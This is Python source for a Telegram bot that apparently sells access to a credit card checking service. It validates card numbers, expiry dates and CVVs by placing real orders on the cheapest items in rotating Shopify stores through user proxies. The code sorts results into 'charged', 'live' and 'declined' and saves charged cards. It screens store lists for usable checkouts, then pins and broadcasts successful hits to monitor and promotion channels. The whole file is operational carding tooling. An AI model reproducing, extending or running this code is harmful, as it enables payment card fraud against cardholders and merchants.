                        log.info(f"[sort]   ↷ {u} live exception ({type(e).__name__}, attempt {_attempt+1}) — retrying" if _attempt < 2 else f"[sort]   ↷ {u} live exception x3 — keeping unverified")
                if res is None:
                    # Proxy/node unreachable — site was never actually tested, don't skip it
                    return _keep(f"OK ${cheap[0]:.2f} · live unverified (node/proxy)")
                try:
                    resp = str(res.get("Response", "") or "")
                    st = str(res.get("Status", "") or "")
                    log.info(f"[sort]   ⚡ {u} live → status={st!r} resp={resp[:160]!r}")

                    r_low = resp.lower()
                    st_low = st.lower()

                    # Transport/proxy-side failures — site was never really tested → keep unverified
                    transport_markers = (
                        "no proxy configured", "proxy burned", "all nodes",
                        "node offline", "empty response", "connection",
                        "connect error", "read timeout", "network",
                    )
                    if any(m in r_low for m in transport_markers):
                        log.info(f"[sort]   ↷ {u} transport issue ({resp[:60]}) — keeping unverified")
                        return _keep(f"OK ${cheap[0]:.2f} · live unverified (transport)")

                    # Real card verdict markers — store processed the card
                    verdict_markers = (
                        "card_declined", "declined", "insufficient_funds",
                        "incorrect_cvc", "invalid_cvc", "incorrect_number",
                        "invalid_number", "invalid_expiry", "expired_card",
                        "do_not_honor", "do not honor", "pickup_card",
                        "stolen_card", "lost_card", "transaction_not_allowed",
                        "fraudulent", "call_issuer", "restricted_card",
                        "3d_secure", "3ds", "three_d_secure", "authentication_required",
                        "approved", "charged", "thank you", "order placed",
                        "ccn live", "ccn_live", "cvv live", "cvv_live",
                        "payment_intent_authentication_failure",
                    )
                    is_verdict = (
                        st_low in ("charged", "approved", "declined", "ccn live", "ccn_live", "live")
                        or any(m in r_low for m in verdict_markers)
                    )

                    if is_verdict:
                        return _keep(f"OK ${cheap[0]:.2f} · live[{(st or resp)[:30]}]")
                    # Not a real card verdict → store failed on its own side
                    return _drop(f"live: {resp[:60] or st or 'no verdict'}")
                except asyncio.TimeoutError:
                    log.info(f"[sort]   ↷ {u} live timeout — DROP")
                    return _drop("live: timeout")
                except Exception as e:
                    log.info(f"[sort]   ↷ {u} live exception ({type(e).__name__}) — DROP")
                    return _drop(f"live: {type(e).__name__}")


        except Exception as e:
            return _drop(f"error ({type(e).__name__}: {str(e)[:60]})")



@router.message(Command("sort"))
async def cmd_sort(message: types.Message):
    uid = message.from_user.id
    if not (auth.is_admin(uid) or auth.is_owner(uid)):
        await message.reply(f"{pe(E['cross'])} {bold('Admins only.')}")
        return

    # Optional live test card:  /sort 4111111111111111|12|2030|123
    # Optional price cap:       /sort max=40
    global _SORT_MAX_PRICE
    live_card = None
    _raw_args = (message.text or "").split(maxsplit=1)
    _rest = _raw_args[1].strip() if len(_raw_args) > 1 else ""
    _tokens = _rest.split()
    _kept_tokens = []
    for t in _tokens:
        if t.lower().startswith("max="):
            try:
                _SORT_MAX_PRICE = max(1.0, float(t.split("=", 1)[1]))
            except Exception:
                pass
        else:
            _kept_tokens.append(t)
    if _kept_tokens:
        cand = " ".join(_kept_tokens).replace("/", "|").replace(":", "|").replace(" ", "|")
        parts = [p for p in cand.split("|") if p]
        if len(parts) >= 4 and parts[0].isdigit() and len(parts[0]) >= 12:
            live_card = "|".join(parts[:4])


    # Gather source URLs
    urls: list[str] = []
    src_label = "sites.txt"
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        if not (doc.file_name or "").lower().endswith(".txt"):
            await message.reply(f"{pe(E['cross'])} {bold('Reply must be a .txt file.')}")
            return
        try:
            from io import BytesIO
            buf = BytesIO()
            await bot.download(doc.file_id, destination=buf)
            buf.seek(0)
            raw = buf.read().decode("utf-8", errors="ignore")
        except Exception:
            await message.reply(f"{pe(E['cross'])} {bold('Failed to read file.')}")
            return
        src_label = doc.file_name
        for line in raw.splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                urls.append(line)
    else:
        try:
            with open(SITES_FILE, "r", encoding="utf-8") as f:
                urls = [l.strip() for l in f if l.strip() and not l.strip().startswith("#")]
        except OSError:
            await message.reply(f"{pe(E['cross'])} {bold('sites.txt not found — reply /sort to a .txt file.')}")
            return

    # dedupe preserving order
    seen: set[str] = set()
    urls = [u for u in urls if not (u in seen or seen.add(u))]
    if not urls:
        await message.reply(f"{pe(E['cross'])} {bold('No URLs to sort.')}")
        return

    total = len(urls)
    _SORT_CANCEL[uid] = False

    # Build full proxy pool from user's saved proxies (rotated per task + retry)
    if live_card:
        try:
            _has_px = bool(get_user_proxies(uid))
        except Exception:
            _has_px = False
        if not _has_px:
            await message.reply(
                f"{pe(E['cross'])} {bold('Card mode needs proxies.')}\n"
                f"{pe(E['next'])} Add some with /proxy first — the API node refuses proxy-less live tests."
            )
            return
    proxy_pool: list[str] = []
    try:
        upx = get_user_proxies(uid)
        for p in upx or []:
            if isinstance(p, str) and p.strip():
                proxy_pool.append(p.strip())
            elif isinstance(p, dict):
                if p.get("proxy_url"):
                    proxy_pool.append(p["proxy_url"])
                else:
                    host = p.get("host") or p.get("ip")
                    user = p.get("user") or p.get("username")
                    if host:
                        if user:
                            proxy_pool.append(f"http://{user}:{p['password']}@{host}:{p['port']}")
                        else:
                            proxy_pool.append(f"http://{host}:{p['port']}")
        random.shuffle(proxy_pool)
    except Exception:
        proxy_pool = []

    header = (
        f"{pe(E['loading'])} {bold('SORTER — SITES INTAKE')}\n"
        f"{BAR_TOP if 'BAR_TOP' in globals() else '─'*20}\n"
        f"{pe(E['link'])} {bold('source')}   <code>{_html.escape(src_label)}</code>\n"
        f"{pe(E['bolt'])} {bold('total')}   {bold(str(total))}\n"
        f"{pe(N['shield'])} {bold('proxies')}   {bold(str(len(proxy_pool)) if proxy_pool else 'none (direct)')}\n"
        f"{pe(E['gem'])} {bold('price cap')}   {bold('$' + format(_SORT_MAX_PRICE, 'g'))}\n"
        f"{pe(E['card'] if 'card' in E else E['bolt'])} {bold('live test')}   {bold('ON · ' + live_card[:6] + 'xxxxxx' if live_card else 'OFF')}\n"
    )
    status = await message.reply(header + f"{pe(E['hourglass'])} {bold('probing...')}")

    # Scale concurrency to proxy pool — one IP = 10; big pool = up to 60
    conc = min(60, max(10, len(proxy_pool) * 3)) if proxy_pool else 10
    if live_card:
        conc = min(conc, 8)  # real API calls are slow — keep the node healthy
    sem = asyncio.Semaphore(conc)
    _proxy_objs = []
    try:
        _proxy_objs = list(get_user_proxies(uid) or [])
    except Exception:
        _proxy_objs = []

    log.info("=" * 62)
    log.info(f"[sort] START | src={src_label} | sites={total} | proxies={len(proxy_pool)} "
             f"| conc={conc} | cap=${_SORT_MAX_PRICE:g} | live={'ON' if live_card else 'OFF'}")
    log.info("=" * 62)

    tasks = [asyncio.create_task(_sort_probe(u, sem, proxy_pool, live_card, _proxy_objs)) for u in urls]



    good: list[str] = []
    unverified: list[tuple[str, str]] = []
    bad: list[tuple[str, str]] = []
    done = 0
    last_edit = 0.0
    for coro in asyncio.as_completed(tasks):
        if _SORT_CANCEL.get(uid):
            for t in tasks:
                t.cancel()
            break
        try:
            url, ok, reason = await coro
        except Exception:
            done += 1
            continue
        done += 1
        if ok:
            good.append(url)
            if "rate-limited" in reason:
                unverified.append((url, reason))
        else:
            bad.append((url, reason))
        now = time.time()
        if now - last_edit > 2.0 or done == total:
            last_edit = now
            pct = int(done / total * 100)
            bar_w = 12
            fill = int(bar_w * done / total)
            bar = "🟦" * fill + "⬜️" * (bar_w - fill)
            await safe_edit(
                status,
                header
                + f"{pe(E['hourglass'])} {bold('progress')}   [{bar}] {bold(str(pct)+'%')}\n"
                + f"{pe(E['check'])} {bold('kept')}   {bold(str(len(good)))}\n"
                + f"{pe(E['cross'])} {bold('dropped')}   {bold(str(len(bad)))}\n"
                + f"{pe(E['next'])} {bold('scanned')}   {bold(f'{done}/{total}')}",
            )

    # Persist cleaned sites.txt
    try:
        with open(SITES_FILE, "w", encoding="utf-8") as f:
            f.write("\n".join(good) + ("\n" if good else ""))
        # Invalidate cache
        global _sites_cache, _sites_cache_mtime, _sites_cache_src
        _sites_cache = None
        _sites_cache_mtime = 0.0
        _sites_cache_src = ""
    except OSError:
        pass

    from aiogram.types import BufferedInputFile
    ts = int(time.time())
    good_bytes = ("\n".join(good) + "\n").encode() if good else b""
    bad_bytes = ("\n".join(f"{u} | {r}" for u, r in bad) + "\n").encode() if bad else b""

    # Bucket drop reasons for quick eyeballing
    from collections import Counter
    def _bucket(r: str) -> str:
        rl = (r or "").lower()
        for key in ("no cheap variant", "no products", "not shopify", "unreachable",
                    "products.json http", "home http", "cart http", "add http",
                    "checkout http", "no session token", "no delivery",
                    "no payment method", "site not supported",
                    "price mismatch", "requires login", "blocked:", "checkout blocked",
                    "checkout login", "live:", "empty"):
            if key in rl:
                return key.rstrip(":").strip()
        return "other"
    reason_counts = Counter(_bucket(r) for _, r in bad).most_common(10)
    reasons_line = " · ".join(f"{k}:{v}" for k, v in reason_counts) if reason_counts else "—"
    log.info(f"[sort] DONE kept={len(good)} dropped={len(bad)} total={total}")
    log.info(f"[sort] drop-reasons: {reasons_line}")

    summary = (
        f"{pe(E['gem'])} {bold('SORTER — DONE')}\n"
        f"{pe(E['link'])} {bold('source')}   <code>{_html.escape(src_label)}</code>\n"
        f"{pe(E['check'])} {bold('kept')}   {bold(str(len(good)))}\n"
        f"{pe(E['hourglass'])} {bold('unverified (429)')}   {bold(str(len(unverified)))}\n"
        f"{pe(E['cross'])} {bold('dropped')}   {bold(str(len(bad)))}\n"
        f"{pe(E['bolt'])} {bold('total')}   {bold(str(total))}\n"
        f"{pe(E['next'])} {bold('top reasons')}   <code>{_html.escape(reasons_line[:200])}</code>"
    )

    await safe_edit(status, summary)
    try:
        if good_bytes:
            await message.reply_document(
                BufferedInputFile(good_bytes, filename=f"sites_clean_{ts}.txt"),
                caption=f"{pe(E['check'])} {bold(str(len(good)))} {bold('clean sites — saved to sites.txt')}",
            )
        if bad_bytes:
            await message.reply_document(
                BufferedInputFile(bad_bytes, filename=f"sites_dropped_{ts}.txt"),
                caption=f"{pe(E['cross'])} {bold(str(len(bad)))} {bold('dropped with reasons')}",
            )
    except Exception:
        pass


@router.message(Command("sortstop"))
async def cmd_sortstop(message: types.Message):
    uid = message.from_user.id
    if not (auth.is_admin(uid) or auth.is_owner(uid)):
        return
    _SORT_CANCEL[uid] = True
    await message.reply(f"{pe(E['stop'])} {bold('Sort will stop after current probes.')}")


@router.message(Command("dead"))
async def cmd_dead(message: types.Message):
    """Admin: show sites auto-removed for repeated store-side failures."""
    uid = message.from_user.id
    if not (auth.is_admin(uid) or auth.is_owner(uid)):
        return
    live = len(_load_sites())
    pending = {k: v for k, v in _SITE_STRIKES.items() if v > 0}
    lines = []
    try:
        if os.path.isfile(DEAD_SITES_FILE):
            with open(DEAD_SITES_FILE, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
    except OSError:
        pass

    txt = (
        f"{pe(E['loading'])} {bold('DEAD SITE MONITOR')}\n\n"
        f"{pe(E['check'])} {bold('Live sites')} — {bold(str(live))}\n"
        f"{pe(E['warn'])} {bold('On strikes')} — {bold(str(len(pending)))}\n"
        f"{pe(E['cross'])} {bold('Auto-removed')} — {bold(str(len(lines)))}\n"
    )
    if pending:
        top = sorted(pending.items(), key=lambda x: -x[1])[:8]
        txt += "\n" + "\n".join(
            f"{pe(E['next'])} {s[:44]} — {n}/{_DEAD_STRIKES}" for s, n in top
        )
    if lines:
        txt += f"\n\n{pe(E['bolt'])} {bold('Last removed:')}\n" + "\n".join(
            f"{pe(E['next'])} {l[:60]}" for l in lines[-8:]
        )
    await message.reply(txt)




# ══════════════════════════════════════════════════════════════════════════════
#  SITE-SIDE ERROR AUTO-ROTATION
#  These responses are the STORE failing, not the card. Retry on another site.
# ══════════════════════════════════════════════════════════════════════════════

_SITE_SIDE_ERRORS = (
    "merchandise_expected_price_mismatch",
    "failed to get session token",
    "session token",
    "generic_error",
    "processing_error",
    "throttled",
    "too many requests",
    "checkpoint",
    "captcha",
    "not supported",
    "no payment method",
    "unable to find",
    "sold out",
    "out of stock",
    "cart is empty",
    "product id is empty",
    "handle is empty",
    "receipt id is empty",
    "tax amount is empty",
    "payment method identifier is empty",
    "all nodes failed",
    "timeout",
    "timed out",
    "requires login",
    "site requires",
    "login required",
    "delivery",
    "shipping",
    "no shipping",
    "address",
    "invalid_state",
    "http 404",
    "http 403",
    "http 5",
    "expired",
    "checkout",
    # --- exact strings produced by api.py ---
    "site not supported",
    "payment method not available",
    "your order total has changed",
    "site error! status",
    "not shopify",
    "no products",
    "no valid products",
    "cart failed",
    "proxy error",
    "graphql error",
    "request failed",
    "invalid json",
    "no data in proposal",
    "session is null",
    "negotiate returned null",
    "result is null",
    "negotiation failed",
    "seller proposal is null",
    "no runningtotal",
    "failed to parse proposal",
    "no delivery data",
    "no valid payment method",
    "unable to get payment token",
    "empty submit response",
    "submit rejected",
    "no receipt",
    "checkpoint denied",
    "captcha_required",
    "store unavailable",
    "delivery_delivery_line_detail_changed",
    "delivery_address_invalid",
    "merchandise_not_enough_stock",
    "merchandise_out_of_stock",
    "merchandise_product_not_published",
)


def _is_site_side_error(response: str) -> bool:
    rl = (response or "").lower()
    return any(k in rl for k in _SITE_SIDE_ERRORS)


# ══════════════════════════════════════════════════════════════════════════════
#  CHEAPEST-VARIANT RESOLVER
#  api.py only reads page 1 of /products.json, so on big stores it settles for
#  whatever cheap-ish item it saw first ($50 etc).  We scan every page and hand
#  the real lowest in-stock variant id straight to the checker.
# ══════════════════════════════════════════════════════════════════════════════

_VARIANT_CACHE: dict = {}          # site -> (variant_id, price, ts)
_VARIANT_TTL = 1800                # 30 min
_VARIANT_MIN_PRICE = 0.50          # ignore 0.00 / freebie test variants
_VARIANT_MAX_PRICE = 15.00         # store is skipped if its cheapest item costs more
_VARIANT_PAGES = 5                 # 5 * 250 = up to 1250 products


async def resolve_cheapest_variant(site: str, proxy_data: dict | None = None):
    """Return (variant_id, price) of the lowest priced in-stock variant, or (None, None)."""
    if not site:
        return None, None
    key = site.rstrip("/").lower()
    hit = _VARIANT_CACHE.get(key)
    if hit and (time.time() - hit[2]) < _VARIANT_TTL:
        return hit[0], hit[1]

    url = site if site.startswith("http") else f"https://{site}"
    url = url.rstrip("/")

    proxy = None
    try:
        proxy = checker_bridge._proxy_data_to_proxy_str(proxy_data)
    except Exception:
        proxy = None

    best_id, best_price = None, None
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            for page in range(1, _VARIANT_PAGES + 1):
                try:
                    async with sess.get(
                        f"{url}/products.json?limit=250&page={page}",
                        proxy=proxy,
                        headers={"User-Agent": "Mozilla/5.0"},
                    ) as resp:
                        if resp.status != 200:
                            break
                        data = await resp.json(content_type=None)
                except Exception:
                    break

                products = (data or {}).get("products") or []
                if not products:
                    break

                for prod in products:
                    for var in prod.get("variants") or []:
                        if not var.get("available", True):
                            continue
                        try:
                            price = float(str(var.get("price", "0")).replace(",", ""))
                        except Exception:
                            continue
                        if price < _VARIANT_MIN_PRICE:
                            continue
                        if best_price is None or price < best_price:
                            best_price = price
                            best_id = str(var.get("id"))
    except Exception:
        pass

    if best_id:
        _VARIANT_CACHE[key] = (best_id, best_price, time.time())
    return best_id, best_price


# Sites that keep failing on the store side get parked for a while so the next
# card doesn't waste an attempt on them again.
_SITE_COOLDOWN: dict = {}
_SITE_COOLDOWN_SECS = 600


def _site_on_cooldown(site: str) -> bool:
    ts = _SITE_COOLDOWN.get((site or "").lower())
    return bool(ts and (time.time() - ts) < _SITE_COOLDOWN_SECS)


def _park_site(site: str) -> None:
    if site:
        _SITE_COOLDOWN[site.lower()] = time.time()


# ══════════════════════════════════════════════════════════════════════════════
#  DEAD-SITE AUTO-REMOVE
#  A store that keeps throwing store-side errors is worthless — after
#  _DEAD_STRIKES failures it is deleted from sites.json / sites.txt for good.
#  A single real gate verdict (Declined / Charged / CVV / OTP) clears strikes.
# ══════════════════════════════════════════════════════════════════════════════

_SITE_STRIKES: dict = {}
_DEAD_STRIKES = 5
DEAD_SITES_FILE = os.path.join(BASE_DIR, "dead_sites.txt")


def _sites_cache_bust() -> None:
    global _sites_cache, _sites_cache_mtime, _sites_cache_src
    _sites_cache = None
    _sites_cache_mtime = 0.0
    _sites_cache_src = ""


def _remove_site_permanently(site: str, reason: str = "") -> bool:
    """Delete a dead store from sites.json + sites.txt. Returns True if removed."""
    if not site:
        return False
    key = site.rstrip("/").lower()
    removed = False

    # sites.json
    try:
        if os.path.isfile(SITES_JSON):
            with open(SITES_JSON, "r", encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, list):
                kept = [
                    e for e in data
                    if (str(e.get("Site") or "").rstrip("/").lower().replace("https://", "").replace("http://", ""))
                    != key.replace("https://", "").replace("http://", "")
                ]
                if len(kept) != len(data):
                    with open(SITES_JSON, "w", encoding="utf-8") as f:
                        json.dump(kept, f, indent=2)
                    removed = True
    except Exception as exc:
        log.warning("dead-site: sites.json cleanup failed for %s — %s", site, exc)

    # sites.txt
    try:
        if os.path.isfile(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8") as f:
                lines = [l.strip() for l in f if l.strip()]
            kept = [
                l for l in lines
                if l.rstrip("/").lower().replace("https://", "").replace("http://", "")
                != key.replace("https://", "").replace("http://", "")
            ]
            if len(kept) != len(lines):
                with open(SITES_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(kept) + ("\n" if kept else ""))
                removed = True
    except Exception as exc:
        log.warning("dead-site: sites.txt cleanup failed for %s — %s", site, exc)

    if removed:
        _sites_cache_bust()
        _SITE_STRIKES.pop(key, None)
        _SITE_COOLDOWN.pop(key, None)
        _VARIANT_CACHE.pop(key, None)
        try:
            with open(DEAD_SITES_FILE, "a", encoding="utf-8") as f:
                f.write(f"{site}  |  {reason[:80]}\n")
        except OSError:
            pass
        log.warning("[dead-site] REMOVED %s — %s", site, reason[:80])
    return removed


def _site_strike(site: str, reason: str = "") -> None:
    """Record a store-side failure; auto-remove once it hits the strike limit."""
    if not site:
        return
    key = site.rstrip("/").lower()
    n = _SITE_STRIKES.get(key, 0) + 1
    _SITE_STRIKES[key] = n
    log.info("[dead-site] strike %d/%d → %s (%s)", n, _DEAD_STRIKES, site, reason[:60])
    if n >= _DEAD_STRIKES:
        _remove_site_permanently(site, reason)


def _site_clear(site: str) -> None:
    """A real gate verdict came back — the store works, reset its strikes."""
    if site:
        _SITE_STRIKES.pop(site.rstrip("/").lower(), None)




async def check_card_rotating(
    cc_str: str,
    proxy_data: dict | None,
    site: str | None = None,
    tries: int = 3,
    proxy_list: list | None = None,
) -> dict:
    """Check a card, silently rotating site (and proxy) whenever the STORE fails.

    Returns the first real gate verdict; if every attempt was a site failure the
    last result is returned unchanged.
    """
    used: set = set()
    result: dict = {}
    cur_site = site or get_random_site()
    cur_proxy = proxy_data
    for _ in range(max(1, tries)):
        if not cur_site:
            break
        used.add(cur_site)
        # always aim at the true cheapest in-stock variant of this store
        variant_id = None
        _vprice = None
        try:
            variant_id, _vprice = await resolve_cheapest_variant(cur_site, cur_proxy)
        except Exception:
            variant_id, _vprice = None, None
        # no reachable catalog at all → the store is dead, strike it hard
        if variant_id is None and _vprice is None:
            _site_strike(cur_site, "no catalog / unreachable")
        # too expensive? don't burn the card on a $60 item — jump to another store
        if _vprice is not None and _vprice > _VARIANT_MAX_PRICE:
            log.info(f"[rotate] skip {cur_site} — cheapest item ${_vprice:.2f} > ${_VARIANT_MAX_PRICE:.2f}")
            _site_strike(cur_site, f"cheapest ${_vprice:.2f} over cap")
            _park_site(cur_site)
            _VARIANT_CACHE.pop(cur_site.rstrip("/").lower(), None)

            nxt2 = None
            for _t in range(40):
                cand = get_random_site()
                if cand and cand not in used and not _site_on_cooldown(cand):
                    nxt2 = cand
                    break
            if not nxt2:
                break
            cur_site = nxt2
            if proxy_list:
                cur_proxy = random.choice(proxy_list)
            continue
        try:
            result = await checker_bridge.check_card_site(cc_str, cur_site, cur_proxy, variant_id)
        except Exception as e:
            result = {"Response": str(e)[:80], "Price": "-", "Gate": "-", "Status": "Error"}
        if not _is_site_side_error(result.get("Response", "")):
            # real gate verdict → this store works, wipe its strikes
            _site_clear(cur_site)
            return result
        # store failed → strike it, park it, drop the stale variant, move on
        _site_strike(cur_site, result.get("Response", ""))
        _park_site(cur_site)
        _VARIANT_CACHE.pop(cur_site.rstrip("/").lower(), None)

        nxt = None
        for _try in range(40):
            cand = get_random_site()
            if cand and cand not in used and not _site_on_cooldown(cand):
                nxt = cand
                break
        if not nxt:
            for _try in range(40):
                cand = get_random_site()
                if cand and cand not in used:
                    nxt = cand
                    break
        if not nxt:
            break
        cur_site = nxt
        if proxy_list:
            cur_proxy = random.choice(proxy_list)
        await asyncio.sleep(0.2)
    return result


# ══════════════════════════════════════════════════════════════════════════════
#  /sh COMMAND — CC Check
# ══════════════════════════════════════════════════════════════════════════════


@router.message(Command("sh"))
async def cmd_sh(message: types.Message):
    joined = await check_user_joined(message.from_user.id)
    if not joined:
        await message.reply(JOIN_MSG, reply_markup=join_keyboard())
        return

    user_id = message.from_user.id

    if auth.is_banned(user_id):
        return

    if not auth.has_premium_access(user_id, message.chat.id):
        await message.reply(
            f"{pe(E['cross'])} {bold('Premium Required!')}"
            f"\n\n{pe(E['bolt'])} {bold('Contact admin or redeem a key.')}"
            f"\n{pe(E['next'])} /redeem {bold('Neon-xxxxx')}"
        )
        return

    # ── Antispam cooldown ─────────────────────────────────────────────────────
    remaining = check_cooldown(user_id)
    if remaining > 0:
        await message.reply(
            f"{pe(E['warn'])} {bold('Slow down!')} Please wait {bold(f'{remaining:.0f}s')} before next check."
        )
        return

    # ── Extract CC ────────────────────────────────────────────────────────────
    cc_str = None

    # 1. Check command args
    args = message.text.split(maxsplit=1)
    if len(args) >= 2:
        cc_str = extract_cc(args[1])
        if not cc_str:
            # Maybe raw format without regex match, try direct
            parts = re.split(r'[|/]', args[1].strip())
            if len(parts) >= 4:
                cc_str = "|".join(p.strip() for p in parts[:4])

    # 2. Check replied message
    if not cc_str and message.reply_to_message:
        reply_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        cc_str = extract_cc(reply_text)

    if not cc_str:
        await message.reply(
            f"{pe(E['warn'])} {bold('No CC found!')}\n\n"
            f"{pe(E['next'])} {bold('Usage:')} /sh 4388540109154632|03|2030|815\n"
            f"{pe(E['next'])} {bold('Or reply to a message containing a CC.')}"
        )
        return

    # ── Check proxy ───────────────────────────────────────────────────────────
    proxy_data = get_user_proxy(user_id)
    if not proxy_data:
        await message.reply(
            f"{pe(E['cross'])} {bold('No Proxy Set!')}\n\n"
            f"{pe(E['warn'])} {bold('You must add a proxy before checking CC.')}\n"
            f"{pe(E['next'])} {bold('Use:')} /proxy host:port:user:pass"
        )
        return

    # ── Get random site ───────────────────────────────────────────────────────
    site = get_random_site()
    if not site:
        await message.reply(
            f"{pe(E['cross'])} {bold('No sites available!')}\n\n"
            f"{pe(E['warn'])} {bold('sites.json / sites.txt is empty.')}"
        )
        return

    # ── Set antispam cooldown ────────────────────────────────────────────────
    set_cooldown(user_id)

    # ── Send loading message FIRST (instant feedback) ──────────────────────────
    cc_number = cc_str.split("|")[0]
    bin_num = cc_number[:6]
    loading_msg = await message.reply(
        f"{pe(E['loading'])} <b>{bold('GATE ENGAGED')}</b>\n"
        f"{BAR_TOP}\n"
        f"{pe(R['cc'])} {bold('card')}   <tg-spoiler>{cc_str}</tg-spoiler>\n"
        f"{pe(R['gate'])} {bold('node')}   <code>{site.split('//')[1][:34] if '//' in site else site[:34]}</code>\n"
        f"{BAR_MID}\n"
        f"<i>{bold('handshaking with shopify checkout')}</i>"
    )

    # ── Run check + BIN lookup in parallel (saves 2-10s) ──────────────────────
    _chk = asyncio.create_task(check_card_rotating(cc_str, proxy_data, site))
    _bin = asyncio.create_task(bin_lookup(bin_num))
    try:
        result = await _chk
    except Exception as e:
        result = {
            "Response": str(e)[:80],
            "Price": "-",
            "Gate": "-",
            "Status": "Error",
        }
    bin_info = await _bin

    # ── Format result ─────────────────────────────────────────────────────────
    response = result.get("Response", "Unknown")
    price = result.get("Price", "-")
    gate = result.get("Gate", "-")
    status = result.get("Status", response)

    # Classify response (logic preserved) + render new v2 card
    rl = response.lower()
    _eid, _tag, _banner = classify_response(response, result)
    status_line = f"{pe(_eid)} <b>{bold(_tag)}</b>   {bold('/')}   <b>{bold(_banner)}</b>"
    result_text = render_result_card(
        cc_str, gate, price, response, result, bin_info,
        user_link(message.from_user.id, message.from_user.full_name, message.from_user.username),
    )

    _hdr, _is_hitlive, _is_dec = _header_tag_for(response, result)
    # GIF on EVERY outcome — charged, live, declined, unknown.
    try:
        await loading_msg.delete()
    except Exception:
        pass
    _card_msg = await send_hit_animation(message.chat.id, result_text)


    # ── Save charged CC ────────────────────────────────────────────────────────
    if _is_charged_response(response, result):
        auth.save_charged_cc(cc_str, user_id, (message.from_user.full_name or "Unknown"), gate, str(price))

    # Pin if order placed / charged
    if _is_charged_response(response, result):
        try:
            if _card_msg:
                await bot.pin_chat_message(message.chat.id, _card_msg.message_id, disable_notification=True)
        except Exception:

            pass
        # Silent forward to monitor group
        try:
            await bot.send_message(auth.MONITOR_GROUP_ID, result_text)
        except Exception:
            pass
        # Charged notification to join channel
        await _send_charged_notification(
            user_id=user_id,
            username=message.from_user.username or "",
            full_name=message.from_user.full_name or "",
            amount=str(price),
            gate_type="shopify",
        )
    # Approved (not charged): send to approved group silently
    elif any(k in rl for k in [
        "insufficient_funds", "insufficient funds",
        "incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv",
        "incorrect_zip",
    ]) or "otp_required" in rl or "3ds" in rl:
        await _send_approved(result_text)
        # Insufficient Funds notification to join channel
        if any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
            await _send_charged_notification(
                user_id=user_id,
                username=message.from_user.username or "",
                full_name=message.from_user.full_name or "",
                amount=str(price),
                gate_type="shopify",
                status_label="Insufficient Funds",
                header_title="INSUFFICIENT FUNDS",
            )


# ══════════════════════════════════════════════════════════════════════════════
#  SHARED: format a single CC result line (compact, for /msh)
# ══════════════════════════════════════════════════════════════════════════════

def _is_charged_response(response: str, result: dict | None = None) -> bool:
    """Detect charged/ORDER_PLACED from shp.py response string or result dict."""
    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "processedreceipt" in rl or "💎" in response:
        return True
    if result:
        if result.get("Charged") == "True" or result.get("Code") == "ORDER_PLACED":
            return True
    return False


# =============================================================================
#  UI v2 -- checker result renderer.  Presentation only; the branch order below
#  is identical to the previous inline classification, so logic is unchanged.
# =============================================================================

def classify_response(response: str, result: dict | None = None) -> tuple[str, str, str]:
    """Return (emoji_id, short_tag, banner_text) for a gate response string."""
    rl = (response or "").lower()
    if _is_charged_response(response, result):
        return E["gem"], "CHARGED", "ORDER COMPLETE"
    if any(k in rl for k in ["insufficient_funds", "insufficient funds"]):
        return E["check2"], "CVV MATCH", "LIVE / INSUFFICIENT FUNDS"
    if any(k in rl for k in ["incorrect_cvc", "invalid_cvc", "incorrect_cvv", "invalid_cvv"]):
        return E["check3"], "CCN MATCH", "LIVE / CVC MISMATCH"
    if "incorrect_zip" in rl:
        return E["check"], "LIVE", "LIVE / ZIP MISMATCH"
    if "otp_required" in rl or "3ds" in rl:
        return E["check"], "3DS OTP", "LIVE / OTP GATE"
    if any(k in rl for k in ["card_declined", "do_not_honor", "declined"]):
        return E["cross"], "DECLINED", "DECLINED"
    if "expired" in rl:
        return E["cross2"], "EXPIRED", "DEAD / EXPIRED"
    if "risky" in rl:
        return E["warn"], "RISKY", "FLAGGED / RISK HOLD"
    if "incorrect_number" in rl:
        return E["cross3"], "DEAD", "DEAD / BAD NUMBER"
    return E["warn2"], "UNKNOWN", "UNKNOWN RESPONSE"


def render_result_card(cc_str, gate, price, response, result, bin_info, checker_link):
    """Render sparkle-style card (v3). Preserves original signature."""
    header, _is_hitlive, _is_dec = _header_tag_for(response, result)
    return render_sparkle_card(
        cc_str, "Shopify Payments", price, response, result,
        bin_info, checker_link, header, is_decline=_is_dec,
    )


def _to_mi(text: str) -> str:
    """Convert ASCII letters to Mathematical Italic Unicode (𝑀𝑒𝑟𝑐ℎ𝑎𝑛𝑡 style)."""
    out = []
    for ch in str(text):
        if 'A' <= ch <= 'Z':
            out.append(chr(0x1D434 + ord(ch) - ord('A')))
        elif 'a' <= ch <= 'z':
            out.append('\u210E' if ch == 'h' else chr(0x1D44E + ord(ch) - ord('a')))
        else:
            out.append(ch)
    return ''.join(out)


async def _send_charged_notification(
    user_id: int, username: str, full_name: str,
    amount: str, gate_type: str = "shopify",
    is_3d_bypassed: bool = False,
    status_label: str = "Order Placed",
    header_title: str = "ORDER PLACED",
) -> None:
    """Send a styled hit notification to the join_chat_id channel."""
    try:
        _is_order = header_title == "ORDER PLACED"

        # ── random custom emoji selection ──────────────────────────────
        _CE_HDR    = pe(random.choice(["5039670412733055750","5767209624675553166","5039816072253932764"])
                        if _is_order else
                        random.choice(["6235628846855492222","5215414165178425004","5375452661036358740"]))
        _CE_UNAME  = pe(random.choice(["5978915975808945445","5978784790327856236","5364105417569868801"]))
        _CE_NAME   = pe(random.choice(["5784914081165087232","6235252066554484059","5375295710046462188"]))
        _CE_STATUS = pe(random.choice(["5226656353744862682","5472250091332993630","5989800724312101453"])
                        if _is_order else
                        random.choice(["6235628846855492222","5215414165178425004","5375452661036358740"]))
        _CE_PRICE  = pe(random.choice(["6235459831302460476","5429651785352501917","5197369495739455200"]))
        _CE_GATE   = pe(random.choice(["5332455502917949981","5039600026809009149","5042111805288089118"]))

        uname_display = _to_mi(f"@{username}" if username else (full_name or "Unknown"))
        name_display  = _to_mi(full_name or "Unknown")
